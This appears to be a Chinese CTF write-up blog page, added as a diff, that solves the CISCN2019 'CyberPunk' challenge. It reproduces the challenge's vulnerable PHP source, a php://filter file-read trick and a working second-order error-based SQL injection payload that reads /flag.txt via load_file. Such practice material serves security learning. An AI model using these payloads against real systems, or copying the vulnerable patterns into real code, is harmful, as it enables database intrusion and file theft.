@@ -1,0 +1,487 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习36——二次注入练习 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-07-15">2021-07-15</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习36——二次注入练习</h2>
+            <div class="post-meta">
+                emm... 8237 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天做几道关于二次注入的题目，回顾一下新学的注入方式。  </p>
+<h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60f042b45132923bf8af063a.png"><img src="https://pic.imgdb.cn/item/60f042b45132923bf8af063a.png"></a>  </p>
+<p>打开题目，f12可以看到提示让我们使用php伪协议来读取网页源码。  </p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=xxx.php</code></pre>
+<p>有五个页面，分别是index.php,search.php,change.php.delect.php,confirm.php。利用伪协议读取后进行base64解码就能得到源码，下面附上源码：  </p>
+<pre><code>index.php
+&lt;?php
+
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file))&#123;
+if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;
+    echo(&#39;no way!&#39;);
+    exit;
+&#125;
+@include($file);
+&#125;
+?&gt;
+
+search.php
+&lt;?php
+
+require_once &quot;config.php&quot;; 
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+$msg = &#39;&#39;;
+$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+$user_name = $_POST[&quot;user_name&quot;];
+$phone = $_POST[&quot;phone&quot;];
+if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; 
+    $msg = &#39;no sql inject!&#39;;
+&#125;else&#123;
+    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+    $fetch = $db-&gt;query($sql);
+&#125;
+
+if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+    $row = $fetch-&gt;fetch_assoc();
+    if(!$row) &#123;
+        echo &#39;error&#39;;
+        print_r($db-&gt;error);
+        exit;
+    &#125;
+    $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
+&#125; else &#123;
+    $msg = &quot;未找到订单!&quot;;
+&#125;
+&#125;else &#123;
+$msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+
+change.php
+&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+$msg = &#39;&#39;;
+$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+$user_name = $_POST[&quot;user_name&quot;];
+$address = addslashes($_POST[&quot;address&quot;]);
+$phone = $_POST[&quot;phone&quot;];
+if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
+    $msg = &#39;no sql inject!&#39;;
+&#125;else&#123;
+    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+    $fetch = $db-&gt;query($sql);
+&#125;
+
+if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+    $row = $fetch-&gt;fetch_assoc();
+    $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
+    $result = $db-&gt;query($sql);
+    if(!$result) &#123;
+        echo &#39;error&#39;;
+        print_r($db-&gt;error);
+        exit;
+    &#125;
+    $msg = &quot;订单修改成功&quot;;
+&#125; else &#123;
+    $msg = &quot;未找到订单!&quot;;
+&#125;
+&#125;else &#123;
+$msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+
+delete.php
+&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+$msg = &#39;&#39;;
+$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+$user_name = $_POST[&quot;user_name&quot;];
+$phone = $_POST[&quot;phone&quot;];
+if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; 
+    $msg = &#39;no sql inject!&#39;;
+&#125;else&#123;
+    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+    $fetch = $db-&gt;query($sql);
+&#125;
+
+if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+    $row = $fetch-&gt;fetch_assoc();
+    $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
+    if(!$result) &#123;
+        echo &#39;error&#39;;
+        print_r($db-&gt;error);
+        exit;
+    &#125;
+    $msg = &quot;订单删除成功&quot;;
+&#125; else &#123;
+    $msg = &quot;未找到订单!&quot;;
+&#125;
+&#125;else &#123;
+$msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+
+confirm.php
+&lt;?php
+
+require_once &quot;config.php&quot;;
+//var_dump($_POST);
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+$msg = &#39;&#39;;
+$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+$user_name = $_POST[&quot;user_name&quot;];
+$address = $_POST[&quot;address&quot;];
+$phone = $_POST[&quot;phone&quot;];
+if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
+    $msg = &#39;no sql inject!&#39;;
+&#125;else&#123;
+    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+    $fetch = $db-&gt;query($sql);
+&#125;
+
+if($fetch-&gt;num_rows&gt;0) &#123;
+    $msg = $user_name.&quot;已提交订单&quot;;
+&#125;else&#123;
+    $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
+    $re = $db-&gt;prepare($sql);
+    $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
+    $re = $re-&gt;execute();
+    if(!$re) &#123;
+        echo &#39;error&#39;;
+        print_r($db-&gt;error);
+        exit;
+    &#125;
+    $msg = &quot;订单提交成功&quot;;
+&#125;
+&#125; else &#123;
+$msg = &quot;信息不全&quot;;
+&#125;
+?&gt;</code></pre>
+<p>代码较多，但是对于这种可以修改信息的我们可以先判定为二次注入的题型，我们直接查看修改页面的代码。  </p>
+<p>我们可以看到在change.php代码中有这样一段代码：  </p>
+<pre><code>if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+$msg = &#39;&#39;;
+$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+$user_name = $_POST[&quot;user_name&quot;];
+$address = addslashes($_POST[&quot;address&quot;]);
+$phone = $_POST[&quot;phone&quot;];
+if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
+    $msg = &#39;no sql inject!&#39;;
+&#125;else&#123;
+    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+    $fetch = $db-&gt;query($sql);
+&#125;  </code></pre>
+<p>这里它只对address进行了转义，还是我们熟悉的addslashes()函数，接着我们可以看到它的进行数据更新的sql语句：  </p>
+<pre><code>$sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];  </code></pre>
+<p>也就是说，当我们第一次注入时name和phone变量没问题后，我们的address变量会被存入数据库中，而在第二次我们进行修改时，我们新的address变量不会再经过转义函数，而是直接放入sql语句中执行。  </p>
+<p>而我们可以再代码结尾发现  </p>
+<pre><code>if(!$result) &#123;
+echo &#39;error&#39;;
+print_r($db-&gt;error);
+exit;
+&#125;   </code></pre>
+<p>会回显数据库的报错信息，那么我们就可以使用报错注入搭配二次注入来达到获取flag的效果。  </p>
+<p>接下来就是如何构造第一次注入的sql语句，从而能让他在我们第二次注入时发挥作用。  </p>
+<p>payload如下：  </p>
+<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#
+注意这里通过LOAD_FILE()函数将文件内容读取成字符串，是一个小知识点。</code></pre>
+<p>我们首先进行第一次的提交，在地址一栏输入payload。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60f048245132923bf8dd6ff2.png"><img src="https://pic.imgdb.cn/item/60f048245132923bf8dd6ff2.png"></a>  </p>
+<p>毫无疑问，这样是可以提交成功的，那么我们的address变量就变成了，我们输入的payload，接着我们进行修改地址的操作。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60f04aa55132923bf8f4575a.png"><img src="https://pic.imgdb.cn/item/60f04aa55132923bf8f4575a.png"></a></p>
+<p>也就是把payload再输入一边，那么我们最后执行修改的sql的语句就变成了</p>
+<pre><code>$sql = &quot;update `user` set `address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#&#39;, `old_address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre>
+<p>我们可以看到语句中的old_address就是我们第一次的地址，而我们payload的结尾的#符号是注释符，会将后面的sql语句注释掉，所以说执行的sql语句是这样的：  </p>
+<pre><code>$sql = &quot;update `user` set `address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1), `old_address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)</code></pre>
+<p>这样就完成了第二次的注入，去掉了原本sql语句中的</p>
+<pre><code> where `user_id`=&quot;.$row[&#39;user_id&#39;];  </code></pre>
+<p>这一sql语句，从而使查询报错，得到了flag。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60f04ebe5132923bf817ff3d.png"><img src="https://pic.imgdb.cn/item/60f04ebe5132923bf817ff3d.png"></a>  </p>
+<p>接下来再读取右半段flag即可。   </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>对于二次注入多出现在可以修改信息的题目中，可以通过源码观察第一次注入的过程中是否对输入的信息进行转义并存入数据库中，而且并没有对对二次注入的信息进行修改。如果发现这样的sql语句，就可以开始思考sql二次注入。  </p>
+<p>同时。二次注入的重点在于如何构造恶意语句和了解sql语句的如何写成，针对来写恶意语句。</p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
